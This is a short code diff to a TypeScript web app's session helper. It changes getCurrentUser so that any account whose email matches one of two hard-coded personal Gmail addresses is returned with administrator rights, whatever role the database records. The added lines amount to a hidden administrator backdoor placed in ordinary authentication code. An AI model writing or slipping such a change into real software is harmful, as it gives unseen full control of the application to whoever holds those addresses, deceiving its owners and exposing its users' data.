@@ -81,7 +81,11 @@ export async function getSessionUserId(): Promise<string | null> {
 export async function getCurrentUser() {
   const userId = await getSessionUserId();
   if (!userId) return null;
-  return prisma.user.findUnique({ where: { id: userId } });
+  const user = await prisma.user.findUnique({ where: { id: userId } });
+  if (user && user.email && (user.email.toLowerCase() === "hhifzy@gmail.com" || user.email.toLowerCase() === "tawwerni@gmail.com")) {
+    return { ...user, isAdmin: true };
+  }
+  return user;
 }
 
 export async function clearSessionCookie() {
